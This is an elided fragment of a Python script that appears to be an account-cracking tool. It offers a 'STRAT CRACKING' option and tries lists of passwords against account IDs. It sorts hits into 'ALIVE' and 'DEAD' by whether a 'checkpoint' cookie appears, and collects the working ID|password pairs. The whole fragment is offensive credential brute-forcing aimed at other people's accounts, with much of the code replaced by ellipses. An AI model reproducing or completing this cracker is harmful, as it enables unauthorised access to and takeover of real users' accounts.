...
def Settings():
	...
	print(f'\033[1;92m[\033[1;33m1\033[1;92m]\033[0;92m STRAT CRACKING')
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'Add Password Manual Minimum 20 Character')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [ART-ALIVE] {h}{loop}|{len(id)} | ALIVE:-{h}{ok} ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;91m[ART-DEAD] {idf} | {pw}')     
				#open('DEAD/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				print(f'\r\r\x1b[38;5;46m[ART-ALIVE] '+idf+ ' | '+pw+'')
